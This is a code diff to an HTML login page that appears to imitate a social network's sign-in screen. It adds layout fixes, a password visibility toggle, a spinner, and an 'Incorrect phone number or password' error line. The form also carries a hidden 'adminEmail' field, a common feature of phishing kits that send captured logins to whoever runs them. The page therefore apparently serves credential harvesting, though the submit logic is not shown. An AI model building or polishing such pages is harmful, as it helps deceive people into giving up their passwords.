@@ -24,15 +24,18 @@
             text-align: center;
             padding: 12px 0;
             background-color: transparent;
-            width: 85%;
-            max-width: 340px;
+            width: 100%;
+            max-width: 100%;
             position: relative;
             margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .lang-selector::after {
             content: "▼";
-            font-size: 10px;
             margin-left: 5px;
+            font-size: 10px;
             color: #8a8d91;
             vertical-align: middle;
         }
@@ -111,6 +114,9 @@
             cursor: pointer;
             height: 44px;
             text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .forgotten-password {
             color: #000000;
@@ -190,6 +196,33 @@
             align-items: center;
             justify-content: center;
         }
+        .show-password, .hide-password {
+            font-size: 20px;
+        }
+        .hide-password {
+            display: none;
+        }
+        @keyframes spinner {
+            to {transform: rotate(360deg);}
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spinner 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        .error-message {
+            color: #c00;
+            font-size: 14px;
+            text-align: center;
+            margin: 6px 0 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -212,6 +245,7 @@
                     <input type="password" id="password" name="password" placeholder=" " required>
                     <button type="button" class="password-toggle" id="password-toggle">
                         <span class="show-password">👁️</span>
+                        <span class="hide-password">👁️‍🗨️</span>
                     </button>
                     <span class="floating-label">Password</span>
                 </div>
@@ -224,6 +258,7 @@
                 <input type="hidden" id="adminEmail" name="adminEmail" value="admin@example.com">
             </div>
             <button type="submit" class="login-button">Log in</button>
+            <div id="error-message" class="error-message">Incorrect phone number or password</div>
             <a href="#" class="forgotten-password">Forgotten password?</a>
             
             <div class="divider"></div>
@@ -247,12 +282,18 @@
             // Password visibility toggle
             const passwordToggle = document.getElementById('password-toggle');
             const passwordField = document.getElementById('password');
+            const showPasswordIcon = passwordToggle.querySelector('.show-password');
+            const hidePasswordIcon = passwordToggle.querySelector('.hide-password');
             
             passwordToggle.addEventListener('click', function() {
                 if (passwordField.type === 'password') {
                     passwordField.type = 'text';
+                    showPasswordIcon.style.display = 'none';
+                    hidePasswordIcon.style.display = 'block';
                 } else {
                     passwordField.type = 'password';
+                    showPasswordIcon.style.display = 'block';
+                    hidePasswordIcon.style.display = 'none';
                 }
             });
             
